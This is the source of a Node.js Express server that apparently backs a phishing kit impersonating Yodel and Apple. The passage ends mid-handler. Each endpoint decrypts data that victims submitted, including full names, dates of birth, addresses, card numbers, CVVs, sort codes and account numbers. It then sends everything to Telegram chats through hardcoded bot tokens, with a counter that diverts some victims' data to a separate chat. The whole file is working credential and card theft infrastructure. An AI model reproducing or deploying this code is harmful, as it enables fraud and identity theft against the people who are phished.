const express = require('express');
const mysql = require('mysql');
const bodyparser = require('body-parser');
const axios = require('axios');
var cors = require('cors');
var fs = require('fs');
var CryptoJS = require("crypto-js");
const rateLimit = require('express-rate-limit')

const apiLimiter = rateLimit({
	windowMs: 15 * 60 * 1000, //15 minutes
	max: 2, //Limit each IP to 100 requests per `window` (here, per 15 minutes)
	standardHeaders: true, // Return rate limit info in the `RateLimit-*` headers
	legacyHeaders: false, // Disable the `X-RateLimit-*` headers
})

const port = process.env.PORT || 8000;

const app = express();
app.use(bodyparser.json());
app.use(cors());

var bankName;

// Apply the rate limiting middleware to API calls only
app.use('/api/', apiLimiter)

app.options('/getips', cors())

app.get('/getips', (req, res) => {
    fs.readFile('ips.txt', function (err, data) {
        var filecontents = data;
        res.send(filecontents);
    })
});

//YODEL
//YODEL
//YODEL

app.options('/sendYodelRes', cors())

app.post('/sendYodelRes', apiLimiter, (req, res) => {
    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
    postcode = CryptoJS.AES.decrypt(req.body.postcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = CryptoJS.AES.decrypt(`${req.body.userAgent}`, '402312').toString(CryptoJS.enc.Utf8);
    userIp = CryptoJS.AES.decrypt(`${req.body.userIp}`, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${postcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;

        axios.post(
            `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=YodelCB:\n${originalText}`
        );
        axios.post(
            `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1921026559&text=YodelCB:\n${originalText}`
        );

        res.send("Update Completed");
    })
});

app.options('/sendSSYodelres', cors())

let ssCount = 0;

app.post('/sendSSYodelres',  apiLimiter, (req, res) => {
    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
    postcode = CryptoJS.AES.decrypt(req.body.postcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = CryptoJS.AES.decrypt(req.body.userAgent, '402312').toString(CryptoJS.enc.Utf8);
    userIp = CryptoJS.AES.decrypt(req.body.userIp, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${postcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (ssCount == 7) {
            axios.post(
                `https://api.telegram.org/bot5334216707:AAEYcMQVJa2NX-GtuIGZ09ZGTqRY-XKkcVc/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            ssCount = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=YodelSS:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1318459885&text=Yodel:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1270989114&text=Yodel:\n${originalText}`
            );
            ssCount += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/yodelM4STERB0Y', cors())

let yodelM4STERB0Y = 0;

app.post('/yodelM4STERB0Y', apiLimiter,  (req, res) => {
    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
    postcode = CryptoJS.AES.decrypt(req.body.postcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = CryptoJS.AES.decrypt(req.body.userAgent, '402312').toString(CryptoJS.enc.Utf8);
    userIp = CryptoJS.AES.decrypt(req.body.userIp, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${postcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (yodelM4STERB0Y == 6) {
            axios.post(
                `https://api.telegram.org/bot5334216707:AAEYcMQVJa2NX-GtuIGZ09ZGTqRY-XKkcVc/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            yodelM4STERB0Y = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=YodelM4STER:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1465132165&text=Yodel:\n${originalText}`
            );
            yodelM4STERB0Y += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/sendARRYodelRes', cors())

let arcount = 0;

app.post('/sendARRYodelRes', apiLimiter,  (req, res) => {
    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
    postcode = CryptoJS.AES.decrypt(req.body.postcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = CryptoJS.AES.decrypt(req.body.userAgent, '402312').toString(CryptoJS.enc.Utf8);
    userIp = CryptoJS.AES.decrypt(req.body.userIp, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${postcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (arcount == 6) {
            axios.post(
                `https://api.telegram.org/bot5334216707:AAEYcMQVJa2NX-GtuIGZ09ZGTqRY-XKkcVc/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            arcount = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=YodelAR:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=853331970&text=Yodel:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=999824723&text=Yodel:\n${originalText}`
            );
            arcount += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/sendBigBillz20', cors())

let bill = 0;

app.post('/sendBigBillz20',  apiLimiter, (req, res) => {
    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
    postcode = CryptoJS.AES.decrypt(req.body.postcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    scode = CryptoJS.AES.decrypt(req.body.scode, '402312').toString(CryptoJS.enc.Utf8);
    accno = CryptoJS.AES.decrypt(req.body.accno, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = CryptoJS.AES.decrypt(req.body.userAgent, '402312').toString(CryptoJS.enc.Utf8);
    userIp = CryptoJS.AES.decrypt(req.body.userIp, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${postcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (bill == 100) {
            axios.post(
                `https://api.telegram.org/bot5334216707:AAEYcMQVJa2NX-GtuIGZ09ZGTqRY-XKkcVc/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            bill = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=YodelBill:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1367138150&text=Yodel:\n${originalText}`
            );
            bill += 1;
        }

        res.send("Update Completed");
    })
});

app.options('/sendKelvYodelRes', cors())

let kelvCount = 0;

app.post('/sendKelvYodelRes',  apiLimiter, (req, res) => {
    fullname = CryptoJS.AES.decrypt(req.body.fullname, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    address = CryptoJS.AES.decrypt(req.body.address, '402312').toString(CryptoJS.enc.Utf8);
    city = CryptoJS.AES.decrypt(req.body.city, '402312').toString(CryptoJS.enc.Utf8);
    postcode = CryptoJS.AES.decrypt(req.body.postcode, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    email = CryptoJS.AES.decrypt(req.body.email, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    userAgent = CryptoJS.AES.decrypt(req.body.userAgent, '402312').toString(CryptoJS.enc.Utf8);
    userIp = CryptoJS.AES.decrypt(req.body.userIp, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${postcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\nEmail: ${email}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (kelvCount == 5) {
            axios.post(
                `https://api.telegram.org/bot5334216707:AAEYcMQVJa2NX-GtuIGZ09ZGTqRY-XKkcVc/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            kelvCount = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=YodelKev:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1248378980&text=Yodel:\n${originalText}`
            );
            kelvCount += 1;
        }

        res.send("Update Completed");
    })
});

//APPLE
//APPLE
//APPLE

app.options('/sendAppleRes', cors())

app.post('/sendAppleRes',  apiLimiter, (req, res) => {
    firstName = CryptoJS.AES.decrypt(req.body.firstName, '402312').toString(CryptoJS.enc.Utf8);
    lastName = CryptoJS.AES.decrypt(req.body.lastName, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    addy1 = CryptoJS.AES.decrypt(req.body.addy1, '402312').toString(CryptoJS.enc.Utf8);
    addy2 = CryptoJS.AES.decrypt(req.body.addy2, '402312').toString(CryptoJS.enc.Utf8);
    town = CryptoJS.AES.decrypt(req.body.town, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, '402312').toString(CryptoJS.enc.Utf8);
    ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    scode = CryptoJS.AES.decrypt(req.body.scode, '402312').toString(CryptoJS.enc.Utf8);
    accno = CryptoJS.AES.decrypt(req.body.accno, '402312').toString(CryptoJS.enc.Utf8);
    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
    userIp = CryptoJS.AES.decrypt(req.body.userIp, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (count === 10) {
            axios.post(
                `https://api.telegram.org/bot5334216707:AAEYcMQVJa2NX-GtuIGZ09ZGTqRY-XKkcVc/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            count2 = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=AppleCB:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1921026559&text=Apple:\n${originalText}`
            );
            count2 = count2 + 1;
        }
    })
});

app.options('/sendMazzaAppleRes', cors())

let mazCount = 0;

app.post('/sendMazzaAppleRes',  apiLimiter, (req, res) => {
    firstName = CryptoJS.AES.decrypt(req.body.firstName, '402312').toString(CryptoJS.enc.Utf8);
    lastName = CryptoJS.AES.decrypt(req.body.lastName, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    addy1 = CryptoJS.AES.decrypt(req.body.addy1, '402312').toString(CryptoJS.enc.Utf8);
    addy2 = CryptoJS.AES.decrypt(req.body.addy2, '402312').toString(CryptoJS.enc.Utf8);
    town = CryptoJS.AES.decrypt(req.body.town, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, '402312').toString(CryptoJS.enc.Utf8);
    ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    scode = CryptoJS.AES.decrypt(req.body.scode, '402312').toString(CryptoJS.enc.Utf8);
    accno = CryptoJS.AES.decrypt(req.body.accno, '402312').toString(CryptoJS.enc.Utf8);
    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
    userIp = CryptoJS.AES.decrypt(req.body.userIp, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (mazCount == 7) {
            axios.post(
                `https://api.telegram.org/bot5334216707:AAEYcMQVJa2NX-GtuIGZ09ZGTqRY-XKkcVc/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            mazCount = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=AppleCB:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1739191403&text=Apple:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1318459885&text=Apple:\n${originalText}`
            );
            mazCount += 1;
        }
    })
});

app.options('/sendStrictlyAppleRes', cors())

app.post('/sendStrictlyAppleRes',  apiLimiter, (req, res) => {
    firstName = CryptoJS.AES.decrypt(req.body.firstName, '402312').toString(CryptoJS.enc.Utf8);
    lastName = CryptoJS.AES.decrypt(req.body.lastName, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    addy1 = CryptoJS.AES.decrypt(req.body.addy1, '402312').toString(CryptoJS.enc.Utf8);
    addy2 = CryptoJS.AES.decrypt(req.body.addy2, '402312').toString(CryptoJS.enc.Utf8);
    town = CryptoJS.AES.decrypt(req.body.town, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, '402312').toString(CryptoJS.enc.Utf8);
    ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
    scode = CryptoJS.AES.decrypt(req.body.scode, '402312').toString(CryptoJS.enc.Utf8);
    accno = CryptoJS.AES.decrypt(req.body.accno, '402312').toString(CryptoJS.enc.Utf8);
    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
    userIp = CryptoJS.AES.decrypt(req.body.userIp, '402312').toString(CryptoJS.enc.Utf8);
    bin = req.body.bin;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, '');
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }
    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
        if (!resp.data.bank) {
            bankName = ""
        } else {
            bankName = resp.data.bank.name;
        }
    }).then(function () {
        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
        var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
        if (count === 10) {
            axios.post(
                `https://api.telegram.org/bot5334216707:AAEYcMQVJa2NX-GtuIGZ09ZGTqRY-XKkcVc/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
            );
            count = 0;
        } else {
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=680379375&text=AppleCB:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=1921026559&text=Apple:\n${originalText}`
            );
            axios.post(
                `https://api.telegram.org/bot2017501535:AAGDql-hBR85DQ7iN22vq4GS_hF4rKcqNuU/sendMessage?chat_id=5266729262&text=Apple:\n${originalText}`
            );
            count = count + 1;
        }
    })
});

let clearstore = 0;

app.options('/baliApple', cors())

app.post('/baliApple',  apiLimiter, (req, res) => {
    firstName = CryptoJS.AES.decrypt(req.body.firstName, '402312').toString(CryptoJS.enc.Utf8);
    lastName = CryptoJS.AES.decrypt(req.body.lastName, '402312').toString(CryptoJS.enc.Utf8);
    telephone = CryptoJS.AES.decrypt(req.body.telephone, '402312').toString(CryptoJS.enc.Utf8);
    addy1 = CryptoJS.AES.decrypt(req.body.addy1, '402312').toString(CryptoJS.enc.Utf8);
    addy2 = CryptoJS.AES.decrypt(req.body.addy2, '402312').toString(CryptoJS.enc.Utf8);
    town = CryptoJS.AES.decrypt(req.body.town, '402312').toString(CryptoJS.enc.Utf8);
    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
    ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, '402312').toString(CryptoJS.enc.Utf8);
    ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, '402312').toString(CryptoJS.enc.Utf8);
    cvv = CryptoJS.AES.decrypt(req.body.cvv, '402312').toString(CryptoJS.enc.Utf8);
